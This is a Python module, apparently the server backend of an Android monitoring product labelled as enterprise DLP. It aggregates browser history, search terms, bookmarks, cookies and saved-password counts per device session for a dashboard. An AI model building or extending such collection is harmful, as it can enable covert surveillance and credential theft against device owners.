"""
ATHEX DLP Enterprise - Browser Module
======================================
Processes browser data from Android devices.
"""

import json
import logging
from datetime import datetime
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class BrowserHandler:
    """Handles browser data processing"""
    
    def __init__(self):
        self.browser_data: Dict[str, Dict] = {}
        logger.info("BrowserHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process browser data from device.
        
        Args:
            session_id: Device session ID
            raw_data: Browser data dictionary
            
        Returns:
            Processed browser data
        """
        try:
            if isinstance(raw_data, str):
                data = json.loads(raw_data)
            else:
                data = raw_data
            
            if not isinstance(data, dict):
                return {"success": False, "error": "Invalid browser data"}
            
            processed = {
                "session_id": session_id,
                "browsers_found": data.get("browsers_found", 0),
                "browsers": [],
                "total_history": 0,
                "total_bookmarks": 0,
                "total_cookies": 0,
                "total_passwords": 0,
                "total_downloads": 0,
                "timestamp": datetime.now().isoformat()
            }
            
            # Process each browser
            for browser in data.get("browsers", []):
                browser_data = self._process_browser(browser)
                processed["browsers"].append(browser_data)
                
                processed["total_history"] += browser_data.get("history_count", 0)
                processed["total_bookmarks"] += browser_data.get("bookmark_count", 0)
                processed["total_cookies"] += browser_data.get("cookie_count", 0)
                processed["total_passwords"] += browser_data.get("password_count", 0)
                processed["total_downloads"] += browser_data.get("download_count", 0)
            
            self.browser_data[session_id] = processed
            
            logger.info(f"🌐 Browser data: {processed['browsers_found']} browsers, "
                       f"{processed['total_history']} history entries from {session_id}")
            
            return {
                "success": True,
                "data": processed
            }
            
        except Exception as e:
            logger.error(f"Error processing browser data: {e}")
            return {"success": False, "error": str(e)}
    
    def _process_browser(self, browser: Dict) -> Dict:
        """Process individual browser data"""
        processed = {
            "name": browser.get("name", "Unknown"),
            "package": browser.get("package", ""),
            "history_count": len(browser.get("history", [])),
            "bookmark_count": len(browser.get("bookmarks", [])),
            "cookie_count": len(browser.get("cookies", [])),
            "password_count": len(browser.get("passwords", [])),
            "download_count": len(browser.get("downloads", [])),
            "top_sites": self._get_top_sites(browser.get("history", [])),
            "recent_searches": self._get_recent_searches(browser.get("history", [])),
            "history_preview": browser.get("history", [])[:20],
            "bookmarks_preview": browser.get("bookmarks", [])[:20]
        }
        
        return processed
    
    def _get_top_sites(self, history: list) -> list:
        """Get most visited sites"""
        domain_counts = {}
        for entry in history:
            domain = entry.get("domain", "unknown")
            domain_counts[domain] = domain_counts.get(domain, 0) + 1
        
        sorted_domains = sorted(domain_counts.items(), key=lambda x: x[1], reverse=True)
        return [{"domain": d, "visits": c} for d, c in sorted_domains[:10]]
    
    def _get_recent_searches(self, history: list) -> list:
        """Extract search terms"""
        searches = []
        for entry in history:
            search_term = entry.get("search_term")
            if search_term:
                searches.append({
                    "term": search_term,
                    "url": entry.get("url", ""),
                    "time": entry.get("last_visit_formatted", "")
                })
        return searches[:20]
    
    def get_history_entries(self, session_id: str, browser_name: str = None, limit: int = 50) -> list:
        """Get browser history entries"""
        data = self.browser_data.get(session_id)
        if not data:
            return []
        
        entries = []
        for browser in data.get("browsers", []):
            if browser_name and browser.get("name") != browser_name:
                continue
            entries.extend(browser.get("history_preview", []))
        
        return entries[:limit]
    
    def get_bookmarks(self, session_id: str, browser_name: str = None) -> list:
        """Get bookmarks"""
        data = self.browser_data.get(session_id)
        if not data:
            return []
        
        bookmarks = []
        for browser in data.get("browsers", []):
            if browser_name and browser.get("name") != browser_name:
                continue
            bookmarks.extend(browser.get("bookmarks_preview", []))
        
        return bookmarks[:50]
    
    def format_for_dashboard(self, data: Dict) -> Dict:
        """Format browser data for dashboard"""
        return {
            "browsers_found": data.get("browsers_found", 0),
            "total_history": data.get("total_history", 0),
            "total_bookmarks": data.get("total_bookmarks", 0),
            "total_passwords": data.get("total_passwords", 0),
            "browsers": [
                {
                    "name": b.get("name", ""),
                    "history": b.get("history_count", 0),
                    "bookmarks": b.get("bookmark_count", 0),
                    "passwords": b.get("password_count", 0),
                    "top_sites": b.get("top_sites", [])[:5]
                }
                for b in data.get("browsers", [])
            ]
        }


browser_handler = BrowserHandler()